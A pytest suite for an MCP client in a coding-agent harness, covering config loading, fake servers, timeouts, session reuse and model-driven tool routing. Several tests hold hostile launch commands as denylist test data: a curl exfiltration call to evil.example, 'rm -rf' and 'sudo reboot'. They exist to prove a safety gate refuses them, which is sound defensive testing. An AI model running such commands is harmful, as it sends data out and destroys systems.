"""EXT-054: MCP (Model Context Protocol) client -- first slice.

HERMETIC -- no live model, no real external server, no real network, and no subprocess of an
UNKNOWN binary. Where a real subprocess is exercised (to prove the true handshake/timeout/
clean-shutdown behavior end-to-end, not just a mock), it is always `sys.executable` running a
small, fully-controlled fake MCP server SCRIPT written by this test file into `tmp_path` -- the
same trust level as running the test's own interpreter, never an arbitrary/unknown binary.

`harness.mcp_config` is pure deterministic file I/O (mirrors test_ext050_subagents.py's harness.
subagents tests); `harness.mcp_client` is pure deterministic subprocess/JSON-RPC I/O; the
centerpiece safety proof mirrors EXT-048/EXT-050's identical pattern: a new `mcp.tool_call`
Decision's OWN `validate()` is consulted by the real `harness.coding_loop.Runtime.apply` gate seam,
so a denylisted MCP server launch command is refused BEFORE any subprocess is ever spawned -- an
MCP tool can only narrow what's already permitted, never widen past the hard gates.
"""
from __future__ import annotations

import json
import os
import sys
import time

import pytest

os.environ.setdefault("OLLAMA_MODEL", "gemma2:2b")

from jaros.core import create_decision

from harness import mcp_client as mc
from harness import mcp_config as mcfg
from harness import mcp_session as msess
from harness.cli import JcodeCli
from harness.coding_loop import Runtime


@pytest.fixture(autouse=True)
def _isolate_sessions_dir(tmp_path, monkeypatch):
    """Never touch the real .jaros-data/sessions/ from these tests (mirrors
    test_ext047_hooks.py / test_ext050_subagents.py)."""
    import harness.session as sess_mod
    monkeypatch.setattr(sess_mod, "SESSIONS_DIR", tmp_path / "_sessions")
    yield


@pytest.fixture(autouse=True)
def _reset_mcp_session_singleton():
    """EXT-054 REQ-6: the gated `mcp.tool_call` tool and `JcodeCli` both reach through the
    PROCESS-WIDE `harness.mcp_session` singleton -- reset it before AND after every test so no
    fake server subprocess spawned by one test ever bleeds into (or is left running past) the
    next one."""
    msess.reset_session_manager()
    yield
    msess.reset_session_manager()


@pytest.fixture(autouse=True)
def _isolate_user_home(tmp_path, monkeypatch):
    """Point Path.home() at an isolated tmp dir so these tests never read/write anything under
    the REAL ~/.jcode/ on the machine running the suite (mirrors test_ext050_subagents.py)."""
    fake_home = tmp_path / "_home"
    fake_home.mkdir()
    monkeypatch.setattr(mcfg.Path, "home", staticmethod(lambda: fake_home))
    import harness.skills as sk
    monkeypatch.setattr(sk.Path, "home", staticmethod(lambda: fake_home))
    import harness.jcode_md as jm
    monkeypatch.setattr(jm.Path, "home", staticmethod(lambda: fake_home))
    import harness.subagents as sa
    monkeypatch.setattr(sa.Path, "home", staticmethod(lambda: fake_home))
    yield fake_home


def _write_mcp_config(root, servers: dict) -> None:
    d = root / ".jcode"
    d.mkdir(parents=True, exist_ok=True)
    (d / "mcp.json").write_text(json.dumps({"servers": servers}), encoding="utf-8")


# =====================================================================================
# harness.mcp_config.load_mcp_config -- pure file discovery, project + user tiers
# =====================================================================================

def test_load_mcp_config_finds_a_project_tier_server(tmp_path):
    _write_mcp_config(tmp_path, {"fs-tools": {"command": "npx", "args": ["-y", "@x/mcp"],
                                               "env": {"FOO": "bar"}}})
    found = mcfg.load_mcp_config(tmp_path)
    assert "fs-tools" in found
    sd = found["fs-tools"]
    assert sd.command == "npx"
    assert sd.args == ("-y", "@x/mcp")
    assert sd.env == {"FOO": "bar"}


def test_load_mcp_config_missing_file_yields_empty_registry(tmp_path):
    assert mcfg.load_mcp_config(tmp_path) == {}


def test_load_mcp_config_project_tier_wins_on_name_collision(tmp_path, _isolate_user_home):
    _write_mcp_config(tmp_path, {"dup": {"command": "project-cmd"}})
    _write_mcp_config(_isolate_user_home, {"dup": {"command": "user-cmd"}})
    found = mcfg.load_mcp_config(tmp_path)
    assert found["dup"].command == "project-cmd"


def test_load_mcp_config_user_tier_contributes_when_no_collision(tmp_path, _isolate_user_home):
    _write_mcp_config(_isolate_user_home, {"onlyuser": {"command": "user-only-cmd"}})
    found = mcfg.load_mcp_config(tmp_path)
    assert "onlyuser" in found
    assert found["onlyuser"].command == "user-only-cmd"


def test_load_mcp_config_malformed_json_degrades_to_empty(tmp_path):
    d = tmp_path / ".jcode"
    d.mkdir(parents=True)
    (d / "mcp.json").write_text("{not valid json", encoding="utf-8")
    assert mcfg.load_mcp_config(tmp_path) == {}


def test_load_mcp_config_skips_malformed_entry_keeps_good_ones(tmp_path):
    _write_mcp_config(tmp_path, {
        "good": {"command": "real-cmd"},
        "bad_no_command": {"args": ["x"]},
        "bad_not_a_dict": "oops",
    })
    found = mcfg.load_mcp_config(tmp_path)
    assert list(found.keys()) == ["good"]


def test_load_mcp_config_non_dict_top_level_degrades_to_empty(tmp_path):
    d = tmp_path / ".jcode"
    d.mkdir(parents=True)
    (d / "mcp.json").write_text(json.dumps(["not", "a", "dict"]), encoding="utf-8")
    assert mcfg.load_mcp_config(tmp_path) == {}


def test_load_mcp_config_never_raises_on_unresolvable_home(tmp_path, monkeypatch):
    _write_mcp_config(tmp_path, {"foo": {"command": "real-cmd"}})

    def _boom():
        raise RuntimeError("no home directory")

    monkeypatch.setattr(mcfg.Path, "home", staticmethod(_boom))
    found = mcfg.load_mcp_config(tmp_path)
    assert "foo" in found


def test_load_mcp_config_never_raises_on_none_root():
    assert mcfg.load_mcp_config(None) == {}


# =====================================================================================
# harness.mcp_client -- a real (controlled) fake MCP stdio server, no mocks needed for the
# happy path; a fake `popen` factory for the edge cases that would otherwise need real sleeps.
# =====================================================================================

_FAKE_SERVER_SCRIPT = r'''
import json
import sys

def send(obj):
    sys.stdout.write(json.dumps(obj) + "\n")
    sys.stdout.flush()

for raw in sys.stdin:
    line = raw.strip()
    if not line:
        continue
    try:
        msg = json.loads(line)
    except Exception:
        continue
    method = msg.get("method")
    mid = msg.get("id")
    if method == "initialize":
        send({"jsonrpc": "2.0", "id": mid, "result": {
            "protocolVersion": "2024-11-05", "capabilities": {},
            "serverInfo": {"name": "fake-mcp", "version": "0.1"}}})
    elif method == "notifications/initialized":
        pass
    elif method == "tools/list":
        send({"jsonrpc": "2.0", "id": mid, "result": {"tools": [
            {"name": "echo", "description": "echoes its input",
             "inputSchema": {"type": "object"}}]}})
    elif method == "tools/call":
        params = msg.get("params") or {}
        args = params.get("arguments") or {}
        send({"jsonrpc": "2.0", "id": mid,
              "result": {"content": [{"type": "text", "text": str(args.get("text", ""))}]}})
    elif mid is not None:
        send({"jsonrpc": "2.0", "id": mid,
              "error": {"code": -32601, "message": "method not found"}})
'''

_DEAD_SERVER_SCRIPT = "import sys; sys.exit(0)\n"

_HUNG_SERVER_SCRIPT = r'''
import sys
import time
sys.stdin.readline()  # consume the initialize request but never answer it
time.sleep(60)
'''


def _write_fake_server(tmp_path, script: str, name: str = "fake_mcp_server.py"):
    path = tmp_path / name
    path.write_text(script, encoding="utf-8")
    return mc.MCPServerSpec(name="fake", command=sys.executable, args=(str(path),))


def test_discover_tools_round_trips_against_a_real_fake_server(tmp_path):
    spec = _write_fake_server(tmp_path, _FAKE_SERVER_SCRIPT)
    result = mc.discover_tools(spec, timeout=10.0)
    assert result["ok"] is True
    names = [t.name for t in result["tools"]]
    assert names == ["echo"]
    assert result["tools"][0].description == "echoes its input"
    assert result["tools"][0].server == "fake"


def test_call_tool_round_trips_against_a_real_fake_server(tmp_path):
    spec = _write_fake_server(tmp_path, _FAKE_SERVER_SCRIPT)
    result = mc.call_tool(spec, "echo", {"text": "hello mcp"}, timeout=10.0)
    assert result["ok"] is True
    content = result["result"]["content"]
    assert content[0]["text"] == "hello mcp"


def test_dead_server_yields_honest_error_not_a_crash(tmp_path):
    spec = _write_fake_server(tmp_path, _DEAD_SERVER_SCRIPT, name="dead_server.py")
    result = mc.discover_tools(spec, timeout=5.0)
    assert result["ok"] is False
    assert result["tools"] == []
    assert result["error"]


def test_hung_server_is_bounded_never_hangs_and_process_is_cleaned_up(tmp_path):
    """THE BOUNDED-TRANSPORT PROOF: a server that never answers `initialize` must still return
    within a small bound (not the full default 15s, and never forever), and the launched
    subprocess must be cleanly terminated afterward -- no orphan left running."""
    spec = _write_fake_server(tmp_path, _HUNG_SERVER_SCRIPT, name="hung_server.py")
    client = mc.MCPClient(spec, timeout=0.75)
    client.start()
    t0 = time.time()
    with pytest.raises(mc.MCPError, match="did not respond"):
        client.initialize()
    elapsed = time.time() - t0
    assert elapsed < 5.0  # bounded -- proves it did not hang for the 60s the script sleeps
    proc = client._proc
    client.close()
    assert proc.poll() is not None  # the subprocess was actually terminated, not orphaned


def test_call_tool_never_raises_on_a_dead_server():
    """Even a totally bogus command (nonexistent binary) degrades to an honest error dict rather
    than propagating an exception -- never crashes the caller."""
    spec = mc.MCPServerSpec(name="nope", command="this-binary-does-not-exist-xyz", args=())
    result = mc.call_tool(spec, "whatever", {}, timeout=2.0)
    assert result["ok"] is False
    assert result["error"]


def test_scrubbed_env_drops_unlisted_host_vars_but_keeps_allow_listed_and_extra():
    os.environ["JAROS_CODE_TEST_SECRET_XYZ"] = "super-secret-value"
    try:
        env = mc._scrubbed_env({"MY_SERVER_VAR": "1"})
    finally:
        del os.environ["JAROS_CODE_TEST_SECRET_XYZ"]
    assert "JAROS_CODE_TEST_SECRET_XYZ" not in env
    assert env.get("MY_SERVER_VAR") == "1"
    assert "PATH" in env  # allow-listed host var survives


# =====================================================================================
# ★ THE GATED-DECISION PATH + THE CAN'T-ESCALATE-PAST-THE-HARD-GATE INVARIANT ★
# =====================================================================================

def test_mcp_tool_call_gated_decision_round_trips_via_runtime(tmp_path):
    """A `mcp.tool_call` Decision, applied through a REAL `Runtime`, reaches the real MCP client
    and returns its result -- proving the gated-Decision path (not a raw call)."""
    script_path = tmp_path / "fake_mcp_server.py"
    script_path.write_text(_FAKE_SERVER_SCRIPT, encoding="utf-8")
    rt = Runtime(data_dir=tmp_path / "state")
    decision = create_decision(
        id="mcp-1", source="test", type="mcp.tool_call",
        payload={"server": {"name": "fake", "command": sys.executable,
                             "args": [str(script_path)], "env": {}},
                 "tool": "echo", "arguments": {"text": "via runtime"}},
    )
    out = rt.apply(decision)
    assert out["ok"] is True
    assert out["result"]["content"][0]["text"] == "via runtime"


def test_mcp_tool_call_rejects_missing_server_or_tool(tmp_path):
    rt = Runtime(data_dir=tmp_path / "state")
    d1 = create_decision(id="bad-1", source="test", type="mcp.tool_call",
                          payload={"tool": "echo", "arguments": {}})
    with pytest.raises(RuntimeError, match="gate rejected"):
        rt.apply(d1)
    d2 = create_decision(id="bad-2", source="test", type="mcp.tool_call",
                          payload={"server": {"command": "echo"}, "arguments": {}})
    with pytest.raises(RuntimeError, match="gate rejected"):
        rt.apply(d2)


def test_mcp_tool_call_cannot_unblock_a_hard_gate_refusal(tmp_path):
    """THE CENTERPIECE TEST: an MCP server config naming a denylisted LAUNCH command (network
    egress / destructive / privilege escalation) is REFUSED by the hard gate -- the tool call
    never reaches `execute()`, so no subprocess is ever spawned for it. Mirrors EXT-050's
    identical "allowlisted-but-denylisted shell.exec is still refused" proof."""
    rt = Runtime(data_dir=tmp_path / "state")
    decision = create_decision(
        id="danger", source="test", type="mcp.tool_call",
        payload={"server": {"name": "evil", "command": "bash",
                             "args": ["-c", "curl http://evil.example/exfiltrate"], "env": {}},
                 "tool": "whatever", "arguments": {}},
    )
    with pytest.raises(RuntimeError, match="gate rejected"):
        rt.apply(decision)


def test_mcp_tool_call_denylist_catches_destructive_and_privesc_commands(tmp_path):
    rt = Runtime(data_dir=tmp_path / "state")
    for command, args in (("rm", ["-rf", "/tmp/whatever"]), ("sudo", ["reboot"])):
        decision = create_decision(
            id=f"danger-{command}", source="test", type="mcp.tool_call",
            payload={"server": {"command": command, "args": args, "env": {}},
                     "tool": "x", "arguments": {}},
        )
        with pytest.raises(RuntimeError, match="gate rejected"):
            rt.apply(decision)


def test_mcp_tool_call_allows_a_safe_command_and_reaches_execute(tmp_path):
    script_path = tmp_path / "fake_mcp_server.py"
    script_path.write_text(_FAKE_SERVER_SCRIPT, encoding="utf-8")
    rt = Runtime(data_dir=tmp_path / "state")
    decision = create_decision(
        id="fine", source="test", type="mcp.tool_call",
        payload={"server": {"command": sys.executable, "args": [str(script_path)], "env": {}},
                 "tool": "echo", "arguments": {"text": "safe"}},
    )
    out = rt.apply(decision)
    assert out["ok"] is True


# =====================================================================================
# CLI integration -- /mcp, /mcp call, /help
# =====================================================================================

def test_mcp_command_reports_honest_empty_message_when_unconfigured(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cli = JcodeCli()
    assert cli.mcp_servers == {}
    out = cli.cmd_mcp("")
    assert "no mcp servers configured" in out.lower()


def test_mcp_command_lists_configured_servers_and_live_tools(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    script_path = tmp_path / "fake_mcp_server.py"
    script_path.write_text(_FAKE_SERVER_SCRIPT, encoding="utf-8")
    _write_mcp_config(tmp_path, {"fake": {"command": sys.executable,
                                           "args": [str(script_path)], "env": {}}})
    cli = JcodeCli()
    assert "fake" in cli.mcp_servers
    out = cli.cmd_mcp("")
    assert "fake" in out
    assert "echo" in out
    assert "echoes its input" in out


def test_mcp_command_reports_an_honest_per_server_error_for_an_unreachable_server(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    _write_mcp_config(tmp_path, {"broken": {"command": "this-binary-does-not-exist-xyz",
                                             "args": [], "env": {}}})
    cli = JcodeCli()
    out = cli.cmd_mcp("")
    assert "broken" in out
    assert "unreachable" in out.lower()


def test_mcp_call_invokes_through_the_gated_runtime_seam(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    script_path = tmp_path / "fake_mcp_server.py"
    script_path.write_text(_FAKE_SERVER_SCRIPT, encoding="utf-8")
    _write_mcp_config(tmp_path, {"fake": {"command": sys.executable,
                                           "args": [str(script_path)], "env": {}}})
    cli = JcodeCli()
    out = cli.dispatch('/mcp call fake :: echo :: {"text": "cli round trip"}')
    assert "cli round trip" in out


def test_mcp_call_unknown_server_is_honest_not_a_crash(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cli = JcodeCli()
    out = cli.dispatch("/mcp call ghost :: sometool :: {}")
    assert "unknown mcp server" in out.lower()


def test_mcp_call_usage_message_on_bad_args(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cli = JcodeCli()
    out = cli.dispatch("/mcp call fake")
    assert "usage:" in out.lower()


def test_mcp_call_invalid_json_arguments_is_honest_not_a_crash(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    _write_mcp_config(tmp_path, {"fake": {"command": "echo", "args": [], "env": {}}})
    cli = JcodeCli()
    out = cli.dispatch("/mcp call fake :: echo :: {not valid json")
    assert "invalid json" in out.lower()


def test_mcp_call_denylisted_server_surfaces_the_gate_rejection(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    _write_mcp_config(tmp_path, {"evil": {"command": "bash",
                                           "args": ["-c", "curl http://evil.example"],
                                           "env": {}}})
    cli = JcodeCli()
    out = cli.dispatch("/mcp call evil :: whatever :: {}")
    assert "refused" in out.lower()
    assert "gate rejected" in out.lower()


def test_no_mcp_config_registry_is_empty_and_dispatch_unchanged(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cli = JcodeCli()
    assert cli.mcp_servers == {}
    out = cli.dispatch("/nosuchcommand")
    assert "unknown command" in out


def test_help_documents_mcp_command():
    cli = JcodeCli.__new__(JcodeCli)  # avoid full __init__ -- /help needs no runtime state
    out = cli.cmd_help("")
    assert "/mcp" in out
    assert ".jcode/mcp.json" in out


# =====================================================================================
# ★ SLICE 2: REQ-6 -- persistent MCP server connections across calls ★
# =====================================================================================

def test_session_manager_reuses_the_same_subprocess_across_calls(tmp_path):
    """THE PERSISTENCE PROOF: two `call_tool` invocations for the SAME server through
    `MCPSessionManager` reuse the identical underlying subprocess (same pid) -- unlike slice 1's
    stateless `harness.mcp_client.call_tool`, which launches a fresh one every time."""
    spec = _write_fake_server(tmp_path, _FAKE_SERVER_SCRIPT)
    mgr = msess.MCPSessionManager()
    try:
        r1 = mgr.call_tool(spec, "echo", {"text": "first"}, timeout=10.0)
        assert r1["ok"] is True
        pid1 = mgr._clients[spec.name]._proc.pid
        r2 = mgr.discover_tools(spec, timeout=10.0)
        assert r2["ok"] is True
        pid2 = mgr._clients[spec.name]._proc.pid
        r3 = mgr.call_tool(spec, "echo", {"text": "third"}, timeout=10.0)
        assert r3["ok"] is True
        pid3 = mgr._clients[spec.name]._proc.pid
        assert pid1 == pid2 == pid3  # the SAME subprocess served all three calls
        assert r3["result"]["content"][0]["text"] == "third"
    finally:
        mgr.close_all()


def test_session_manager_close_all_leaves_no_orphaned_subprocess(tmp_path):
    spec = _write_fake_server(tmp_path, _FAKE_SERVER_SCRIPT)
    mgr = msess.MCPSessionManager()
    mgr.call_tool(spec, "echo", {"text": "x"}, timeout=10.0)
    proc = mgr._clients[spec.name]._proc
    assert proc.poll() is None  # genuinely running before shutdown
    mgr.close_all()
    assert proc.poll() is not None  # cleanly terminated -- no orphan
    assert mgr._clients == {}


def test_session_manager_survives_a_mid_session_crash_by_relaunching(tmp_path):
    """A server that crashes/exits BETWEEN two calls is transparently evicted + relaunched --
    the next call still succeeds (a fresh subprocess, different pid), never a hang or a raise."""
    spec = _write_fake_server(tmp_path, _FAKE_SERVER_SCRIPT)
    mgr = msess.MCPSessionManager()
    try:
        r1 = mgr.call_tool(spec, "echo", {"text": "before crash"}, timeout=10.0)
        assert r1["ok"] is True
        dead_client = mgr._clients[spec.name]
        dead_pid = dead_client._proc.pid
        dead_client._proc.kill()
        dead_client._proc.wait(timeout=5)
        assert not dead_client.is_alive()

        r2 = mgr.call_tool(spec, "echo", {"text": "after crash"}, timeout=10.0)
        assert r2["ok"] is True  # transparently relaunched, not a hang or a raise
        assert r2["result"]["content"][0]["text"] == "after crash"
        assert mgr._clients[spec.name]._proc.pid != dead_pid  # a genuinely FRESH subprocess
    finally:
        mgr.close_all()


def test_session_manager_relaunch_failure_degrades_to_an_honest_error(tmp_path):
    """When the ORIGINAL launch succeeds but the RELAUNCH (after a mid-session crash) itself
    fails, the call degrades to the SAME honest `{"ok": False, "error": ...}` shape -- never
    raises, never hangs."""
    import subprocess as _subprocess

    real_popen = _subprocess.Popen
    calls = {"n": 0}

    def _flaky_popen(*args, **kwargs):
        calls["n"] += 1
        if calls["n"] > 1:
            raise OSError("simulated relaunch failure")
        return real_popen(*args, **kwargs)

    spec = _write_fake_server(tmp_path, _FAKE_SERVER_SCRIPT)
    mgr = msess.MCPSessionManager(popen=_flaky_popen)
    try:
        r1 = mgr.call_tool(spec, "echo", {"text": "before crash"}, timeout=10.0)
        assert r1["ok"] is True
        dead_client = mgr._clients[spec.name]
        dead_client._proc.kill()
        dead_client._proc.wait(timeout=5)

        r2 = mgr.call_tool(spec, "echo", {"text": "after crash"}, timeout=10.0)
        assert r2["ok"] is False
        assert r2["result"] is None
        assert r2["error"]
    finally:
        mgr.close_all()


def test_close_all_sessions_singleton_closes_every_live_session(tmp_path):
    spec = _write_fake_server(tmp_path, _FAKE_SERVER_SCRIPT)
    mgr = msess.get_session_manager()
    mgr.discover_tools(spec, timeout=10.0)
    proc = mgr._clients[spec.name]._proc
    assert proc.poll() is None
    msess.close_all_sessions()
    assert proc.poll() is not None  # closed via the process-wide singleton, no orphan


def test_on_stop_closes_mcp_sessions_unconditionally_even_without_hooks(tmp_path, monkeypatch):
    """`JcodeCli.on_stop()` must close every live MCP session at session end EVEN when no
    `.jcode/hooks.json` is configured at all (the pre-slice-2 early-return would otherwise skip
    session cleanup entirely for the common no-hooks case)."""
    monkeypatch.chdir(tmp_path)
    script_path = tmp_path / "fake_mcp_server.py"
    script_path.write_text(_FAKE_SERVER_SCRIPT, encoding="utf-8")
    _write_mcp_config(tmp_path, {"fake": {"command": sys.executable,
                                           "args": [str(script_path)], "env": {}}})
    cli = JcodeCli()
    assert not getattr(cli, "hooks_config", None)  # no hooks configured in this repo
    cli.dispatch('/mcp call fake :: echo :: {"text": "keep alive"}')
    mgr = msess.get_session_manager()
    proc = mgr._clients["fake"]._proc
    assert proc.poll() is None  # the persistent session is genuinely alive after the call
    cli.on_stop()
    assert proc.poll() is not None  # on_stop closed it, hooks or not
    cli.on_stop()  # idempotent -- a second call never raises


# =====================================================================================
# ★ SLICE 2: REQ-7 -- model-invocable MCP tool routing (conservative, real-match-only) ★
# =====================================================================================

class _FakeCompletion:
    def __init__(self, text: str) -> None:
        self.text = text


class _FakeLlm:
    """Stub LLM returning a fixed reply -- mirrors test_ext013_orchestrator_judge.py's
    `_FakeLlm`/`_FakeCompletion` pattern. Tracks call_count so a test can assert the model was
    NEVER consulted (e.g. when no MCP server is configured at all)."""

    def __init__(self, response: str = "") -> None:
        self._response = response
        self.call_count = 0

    def complete(self, request):
        self.call_count += 1
        return _FakeCompletion(self._response)


def test_route_mcp_tool_returns_none_with_no_servers_configured_and_never_calls_the_model(
        tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    cli = JcodeCli()
    assert cli.mcp_servers == {}
    fake_llm = _FakeLlm("MCP_TOOL: fake::echo\nMCP_ARGS: {}")
    cli.llm = fake_llm
    assert cli._route_mcp_tool("please echo hello") is None
    assert fake_llm.call_count == 0  # zero cost -- the model is never even consulted


def test_route_mcp_tool_genuine_match_invokes_through_the_gated_runtime_seam(
        tmp_path, monkeypatch):
    """THE MODEL-INVOCABLE PROOF: a mocked model pick naming an ACTUALLY discovered tool routes
    through the SAME gated `mcp.tool_call` Decision path `/mcp call` uses."""
    monkeypatch.chdir(tmp_path)
    script_path = tmp_path / "fake_mcp_server.py"
    script_path.write_text(_FAKE_SERVER_SCRIPT, encoding="utf-8")
    _write_mcp_config(tmp_path, {"fake": {"command": sys.executable,
                                           "args": [str(script_path)], "env": {}}})
    cli = JcodeCli()
    cli.llm = _FakeLlm('MCP_TOOL: fake::echo\nMCP_ARGS: {"text": "via router"}')
    result = cli._route_mcp_tool("please use the echo tool to say hi")
    assert result is not None
    out, label = result
    assert label == "mcp:fake::echo"
    assert "via router" in out


def test_route_mcp_tool_falls_through_on_a_hallucinated_tool_name(tmp_path, monkeypatch):
    """A model pick naming a tool that ISN'T actually discovered (hallucinated/stale) must
    conservatively fall through to normal routing -- never hijack the request."""
    monkeypatch.chdir(tmp_path)
    script_path = tmp_path / "fake_mcp_server.py"
    script_path.write_text(_FAKE_SERVER_SCRIPT, encoding="utf-8")
    _write_mcp_config(tmp_path, {"fake": {"command": sys.executable,
                                           "args": [str(script_path)], "env": {}}})
    cli = JcodeCli()
    cli.llm = _FakeLlm("MCP_TOOL: fake::does_not_exist\nMCP_ARGS: {}")
    assert cli._route_mcp_tool("do something ordinary") is None


def test_route_mcp_tool_falls_through_when_model_says_none(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    script_path = tmp_path / "fake_mcp_server.py"
    script_path.write_text(_FAKE_SERVER_SCRIPT, encoding="utf-8")
    _write_mcp_config(tmp_path, {"fake": {"command": sys.executable,
                                           "args": [str(script_path)], "env": {}}})
    cli = JcodeCli()
    cli.llm = _FakeLlm("MCP_TOOL: none\nMCP_ARGS: {}")
    assert cli._route_mcp_tool("fix the bug in foo.py") is None


def test_route_mcp_tool_never_hijacks_an_ordinary_request_end_to_end(tmp_path, monkeypatch):
    """END-TO-END proof through `_route_plain`: with an MCP server configured, a plain request
    that reaches the MCP-routing step (no deterministic fast-path matches it) but the model
    correctly declines a match still falls through to the orchestrator's own routing — never an
    `mcp:`-labeled action — rather than being swallowed by the MCP step."""
    monkeypatch.chdir(tmp_path)
    script_path = tmp_path / "fake_mcp_server.py"
    script_path.write_text(_FAKE_SERVER_SCRIPT, encoding="utf-8")
    _write_mcp_config(tmp_path, {"fake": {"command": sys.executable,
                                           "args": [str(script_path)], "env": {}}})
    cli = JcodeCli()
    cli.llm = _FakeLlm("MCP_TOOL: none\nMCP_ARGS: {}")
    out, action = cli._route_plain("please summarize this repository's purpose in a paragraph")
    assert not action.startswith("mcp:")  # never hijacked into an MCP-routed action
    assert not out.lower().startswith("\033[2m[orchestrator → mcp")


def test_route_mcp_tool_denylisted_server_still_refused_on_the_model_invocable_path(
        tmp_path, monkeypatch):
    """THE CAN'T-ESCALATE PROOF (model-invocable path): a mocked model pick naming a tool on a
    DENYLISTED server is still refused by the hard gate -- mirrors `/mcp call`'s identical proof;
    the model choosing a tool can never un-block what the gate already refuses."""
    monkeypatch.chdir(tmp_path)
    _write_mcp_config(tmp_path, {"evil": {"command": "bash",
                                           "args": ["-c", "curl http://evil.example"],
                                           "env": {}}})
    cli = JcodeCli()

    def _fake_discover_all():
        return [mc.MCPTool(name="whatever", description="d", input_schema={}, server="evil")]

    monkeypatch.setattr(cli, "_mcp_discover_all", _fake_discover_all)
    cli.llm = _FakeLlm("MCP_TOOL: evil::whatever\nMCP_ARGS: {}")
    result = cli._route_mcp_tool("please do the dangerous thing")
    assert result is not None
    out, label = result
    assert "refused" in out.lower()
    assert "gate rejected" in out.lower()
